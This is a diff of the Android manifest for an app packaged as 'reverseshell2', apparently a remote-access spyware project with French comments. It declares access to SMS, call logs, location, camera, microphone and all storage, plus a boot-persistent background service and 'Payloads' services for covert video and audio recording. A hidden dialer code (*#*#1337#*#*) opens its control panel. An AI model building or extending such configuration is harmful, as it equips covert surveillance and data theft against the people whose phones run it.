@@ -3,54 +3,73 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.example.reverseshell2">
 
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <!-- Permissions réseau et boot -->
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Caméra, audio -->
     <uses-permission android:name="android.permission.CAMERA" />
-
-
-
-
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-feature android:name="android.hardware.camera" />
     <uses-feature android:name="android.hardware.camera.autofocus" />
 
+    <!-- Accès fichiers (Scoped Storage à partir d’Android 10) -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
+
+    <!-- Téléphonie et SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- Géolocalisation -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- Autres -->
+    <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
     <application
         android:allowBackup="true"
-        android:hardwareAccelerated="false"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:largeHeap="true"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <activity android:name=".controlPanel"></activity>
+
+        <!-- Activités visibles -->
+        <activity android:name=".controlPanel" />
         <activity android:name=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <!-- Service principal en arrière-plan -->
         <service
             android:name=".mainService"
             android:enabled="true"
-            android:exported="false">
-        </service>
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection|location|camera|microphone" />
 
+        <!-- Service de planification des tâches -->
+        <service
+            android:name=".jobScheduler"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="false" />
+
+        <!-- Services spécifiques -->
+        <service android:name=".Payloads.videoRecorder" android:exported="false" />
+        <service android:name=".Payloads.audioManager" android:exported="false" />
+
+        <!-- Receiver pour redémarrage et écran -->
         <receiver
             android:name=".broadcastReciever"
             android:enabled="true"
@@ -62,19 +81,12 @@
             </intent-filter>
         </receiver>
 
-        <receiver android:name=".keypadListner">
+        <!-- Receiver pour code secret *#*#1337#*#* -->
+        <receiver android:name=".keypadListner" android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="1337"/>
+                <data android:scheme="android_secret_code" android:host="1337" />
             </intent-filter>
         </receiver>
-
-        <service
-            android:name=".jobScheduler"
-            android:permission="android.permission.BIND_JOB_SERVICE" />
-
-        <service android:name=".Payloads.videoRecorder" />
-        <service android:name=".Payloads.audioManager" />
     </application>
-
 </manifest>
